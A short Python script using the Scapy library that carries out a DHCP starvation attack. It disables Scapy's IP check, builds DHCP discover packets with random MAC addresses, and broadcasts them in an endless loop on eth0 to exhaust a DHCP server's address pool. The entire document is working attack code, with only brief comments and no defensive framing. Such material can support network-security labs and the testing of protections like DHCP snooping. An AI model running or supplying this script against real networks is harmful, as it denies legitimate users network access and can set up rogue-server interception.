# DHCP-Starvation
# Import Scapy
from scapy.all import *

#conf.checkIPaddr needs to be set to false
#when conf.checkIPaddr the response IP isn't checked
#against sending IP address don't need to match
conf.checkIPaddr = False

# Create DHCP discover with destination IP = Broadcast
# Source MAC address is a random MAC address
# Source IP address = 0.0.0.0
# Destination IP address = broadcast
# Source port = 68 (DHCP/BOOTP client)
# Destination port = 67 (DHCP/BOOTP server)
# DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) \
                    /IP(src='0.0.0.0', dst='255.255.255.255') \
                    /UDP(sport=68, dport=67) \
                    /BOOTP(ap=1, chaddr=RandMAC()) \
                    /DHCP(options=[('message-type', 'discover'), ('end')])

# Send packet out of eth0 and loop the packet 
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)